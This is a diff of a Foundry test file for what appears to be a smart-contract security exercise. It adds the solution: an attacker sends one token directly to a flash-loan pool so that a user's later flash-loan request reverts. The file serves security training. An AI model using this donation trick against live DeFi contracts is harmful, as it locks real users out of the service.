@@ -12,7 +12,6 @@ import "src/dos-3/FlashLoanUser.sol";
  * @dev run "forge test -vvv --match-contract DOS3"
  */
 contract TestDOS3 is Test {
-
     uint256 constant INITIAL_SUPPLY = 1_000_000 ether;
     uint256 constant TOKENS_IN_POOL = 100_000 ether;
     uint256 constant ATTACKER_TOKENS = 10 ether;
@@ -26,7 +25,9 @@ contract TestDOS3 is Test {
     FlashLoanUser userContract;
 
     function setUp() public {
-        /** SETUP EXERCISE - DON'T CHANGE ANYTHING HERE */
+        /**
+         * SETUP EXERCISE - DON'T CHANGE ANYTHING HERE
+         */
 
         // Deploy contracts
         vm.startPrank(deployer);
@@ -46,12 +47,19 @@ contract TestDOS3 is Test {
         vm.startPrank(user);
         userContract = new FlashLoanUser(address(pool));
         userContract.requestFlashLoan(10);
+        vm.stopPrank();
     }
 
     function testDosAttack() public {
-        /** CODE YOUR SOLUTION HERE */
-        
-        /** SUCCESS CONDITIONS */
+        /**
+         * CODE YOUR SOLUTION HERE
+         */
+        vm.prank(attacker);
+        token.transfer(address(pool), 1);
+
+        /**
+         * SUCCESS CONDITIONS
+         */
         vm.startPrank(user);
         vm.expectRevert();
         userContract.requestFlashLoan(10);
